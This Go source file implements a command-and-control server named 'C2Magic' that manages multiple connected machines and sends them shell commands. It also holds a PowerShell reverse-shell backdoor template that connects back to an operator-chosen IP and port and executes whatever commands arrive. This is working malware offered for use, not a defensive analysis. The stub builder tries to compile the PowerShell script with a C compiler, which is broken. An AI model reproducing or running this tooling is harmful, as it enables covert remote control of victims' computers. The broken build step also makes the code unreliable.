package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var (
	connections         = make(map[int]net.Conn)        // Store connections with unique ID
	deviceOutputChannels = make(map[int]chan string)    // Store output channels for each device
	mu                  sync.Mutex                      // For safe concurrent map access
	deviceCounter       = 1                             // Counter for device IDs
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./C2Magic <port>")
		os.Exit(1)
	}

	port := os.Args[1]
	fmt.Println("\n2024 blackmagic baby <3")
	fmt.Println("Starting C2Magic on port", port)

	// Start the TCP listener on the specified port
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Println("Error starting server:", err)
		os.Exit(1)
	}
	defer listener.Close()
	fmt.Println("Listening for connections on port", port)

	// Goroutine to handle input for commands
	go handleCommands()

	// Accept incoming connections and handle each in a separate goroutine
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		mu.Lock()
		deviceID := deviceCounter
		connections[deviceID] = conn
		deviceOutputChannels[deviceID] = make(chan string, 100) // Create output channel for new device
		deviceCounter++
		mu.Unlock()

		fmt.Printf("New connection from %s assigned ID: %d\n", conn.RemoteAddr().String(), deviceID)

		go handleConnection(conn, deviceID)
	}
}

// Function to handle individual client connections
func handleConnection(conn net.Conn, deviceID int) {
	defer func() {
		conn.Close()
		mu.Lock()
		delete(connections, deviceID)
		delete(deviceOutputChannels, deviceID) // Clean up output channel
		mu.Unlock()
		fmt.Println("Connection closed for device ID:", deviceID)
	}()

	reader := bufio.NewReader(conn)
	for {
		// Read incoming data from the client
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from device ID", deviceID, ":", err)
			return
		}

		// Send the message to the device's output channel
		mu.Lock()
		if outputChan, exists := deviceOutputChannels[deviceID]; exists {
			outputChan <- message
		}
		mu.Unlock()

		printGreenOutput(fmt.Sprintf("Device %d: %s", deviceID, message))
	}
}

// Function to handle user input commands and send them to clients
func handleCommands() {
	for {
		// Display the command menu with spacing for clarity
		fmt.Println("\n--- Command Menu ---")
		fmt.Println("1. Send command to all clients")
		fmt.Println("2. Send command to a specific client")
		fmt.Println("3. List connected clients")
		fmt.Println("4. Create client stub")
		fmt.Print("\nSelect an option: ")

		var choice int
		fmt.Scanln(&choice)

		switch choice {
		case 1:
			// Send command to all clients
			fmt.Print("Enter command to send to all clients: ")
			reader := bufio.NewReader(os.Stdin)
			command, _ := reader.ReadString('\n')
			command = strings.TrimSpace(command)
			broadcastCommand(command)

		case 2:
			// Send command to a specific client
			fmt.Print("Enter device ID to send command: ")
			var deviceID int
			fmt.Scanln(&deviceID)
			sendCommandToClient(deviceID)

		case 3:
			// List all connected clients
			listClients()

		case 4:
			CreateStub()

		default:
			fmt.Println("\nInvalid choice")
		}
	}
}

func CreateStub() {
	// User input for IP, port, file name, and output directory
	var ip, port, fileName, outputDir string
	fmt.Print("Enter IP for client to connect to: ")
	fmt.Scanln(&ip)
	fmt.Print("Enter port for client to connect to: ")
	fmt.Scanln(&port)
	fmt.Print("Enter file name for the executable (e.g., client.exe): ")
	fmt.Scanln(&fileName)
	fmt.Print("Enter output directory: ")
	fmt.Scanln(&outputDir)

	// Set default output directory if none provided
	if outputDir == "" {
		outputDir = "."
	}

	// PowerShell script template, with user-defined IP and port
	powershellScript := fmt.Sprintf(`Set-Variable -Name client -Value (Set-Variable -Name stream -Value (Set-Variable -Name buffer -Value (Set-Variable -Name writer -Value (Set-Variable -Name data -Value (Set-Variable -Name result -Value ($null))))));
try {
	Set-Variable -Name client -Value (New-Object Net.Sockets.TcpClient("%s", %s));
	Set-Variable -Name stream -Value ($client.GetStream());
	Set-Variable -Name buffer -Value (New-Object Byte[] 1024);
	Set-Variable -Name encoding -Value (New-Object Text.UTF8Encoding);
	Set-Variable -Name writer -Value (New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024));
	$writer.AutoFlush = $true;
	Write-Host "Running...";
	Write-Host"";
	Set-Variable -Name bytes -Value (0);
	do {
		$writer.Write("PS>");
		do {
			Set-Variable -Name bytes -Value ($stream.Read($buffer, 0, $buffer.Length));
			if ($bytes -gt 0) {
				$data += $encoding.GetString($buffer, 0, $bytes);
			}
		} while ($stream.DataAvailable);
		if ($bytes -gt 0) {
			$data = $data.Trim();
			if ($data.Length -gt 0) {
				try {
					$result = Invoke-Expression -Command $data 2>&1 | Out-String;
				} catch {
					$result = $_.Exception | Out-String;
				}
				Clear-Variable data;
				if ($result.Length -gt 0) {
					$writer.Write($result);
					Clear-Variable result;
				}
			}
		}
	} while ($bytes -gt 0);
	Write-Host "Backdoor will now exit...";
} catch {
	Write-Host $_.Exception.InnerException.Message;
} finally {
	if ($writer -ne $null) { $writer.Close(); $writer.Dispose(); Clear-Variable writer; }
	if ($stream -ne $null) { $stream.Close(); $stream.Dispose(); Clear-Variable stream; }
	if ($client -ne $null) { $client.Close(); $client.Dispose(); Clear-Variable client; }
	if ($buffer -ne $null) { $buffer.Clear(); Clear-Variable buffer; }
	if ($result -ne $null) { Clear-Variable result; }
	if ($data -ne $null) { Clear-Variable data; }
	[GC]::Collect();
}`, ip, port)

	// Create a temporary file to hold the PowerShell script
	tempFile, err := os.CreateTemp("", "temp_script_*.ps1")
	if err != nil {
		fmt.Println("Error creating temporary script file:", err)
		return
	}
	defer os.Remove(tempFile.Name()) // Ensure temp file is removed after execution

	// Write the PowerShell script to the temp file
	_, err = tempFile.WriteString(powershellScript)
	if err != nil {
		fmt.Println("Error writing to temporary script file:", err)
		return
	}
	tempFile.Close()

	// Compile the PowerShell script to an executable with mingw-w64
	outputPath := fmt.Sprintf("%s/%s", outputDir, fileName)
	cmd := exec.Command("x86_64-w64-mingw32-gcc", "-o", outputPath, tempFile.Name())
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Compilation failed: %s\n", output)
		return
	}

	fmt.Println("Stub created successfully at", outputPath)
}

// Helper function to send a command to all connected clients
func broadcastCommand(command string) {
	mu.Lock()
	defer mu.Unlock()

	for deviceID, conn := range connections {
		fmt.Printf("Sending command to device %d\n", deviceID)
		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Printf("Failed to send command to device %d: %v\n", deviceID, err)
		} else {
			fmt.Printf("Command sent to device %d\n", deviceID)
			
			// Wait for output with timeout for each device
			if outputChan, exists := deviceOutputChannels[deviceID]; exists {
				go waitForOutput(outputChan)
			}
		}
	}
}

// Helper function to send a command to a specific client by device ID
func sendCommandToClient(deviceID int) {
	mu.Lock()
	conn, exists := connections[deviceID]
	if !exists {
		mu.Unlock()
		fmt.Printf("Device with ID %d not found.\n", deviceID)
		return
	}
	
	// Get the output channel for this device
	outputChan, chanExists := deviceOutputChannels[deviceID]
	if !chanExists {
		outputChan = make(chan string, 100)
		deviceOutputChannels[deviceID] = outputChan
	}
	mu.Unlock()

	fmt.Printf("Connected to device ID %d. Type 'back' to return to main menu.\n", deviceID)
	
	for {
		fmt.Print("C2Magic> ")
		reader := bufio.NewReader(os.Stdin)
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "back" {
			fmt.Println("Returning to main menu...")
			break
		}

		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Printf("Failed to send command to device %d: %v\n", deviceID, err)
			return
		}
		fmt.Printf("Command sent to device %d\n", deviceID)

		// Wait for output with timeout
		waitForOutput(outputChan)
		
		// Add a small delay before showing the next prompt
		time.Sleep(500 * time.Millisecond)
	}
}

// Helper function to wait for command output
func waitForOutput(outputChan chan string) {
	timeout := time.After(5 * time.Second)
	lastOutput := time.Now()

	for {
		select {
		case <-outputChan:
			lastOutput = time.Now()
		case <-timeout:
			// If no output for 5 seconds, assume command is done
			if time.Since(lastOutput) > 4*time.Second {
				return
			}
			timeout = time.After(1 * time.Second)
		}
	}
}

// Helper function to list all connected clients
func listClients() {
	mu.Lock()
	defer mu.Unlock()

	if len(connections) == 0 {
		fmt.Println("No clients connected.")
		return
	}

	fmt.Println("Connected clients:")
	for deviceID, conn := range connections {
		fmt.Printf("Device ID: %d, IP: %s\n", deviceID, conn.RemoteAddr().String())
	}
}

// Helper function to print the received data in green
func printGreenOutput(output string) {
	green := color.New(color.FgGreen).SprintFunc()
	fmt.Println(green(output))
}
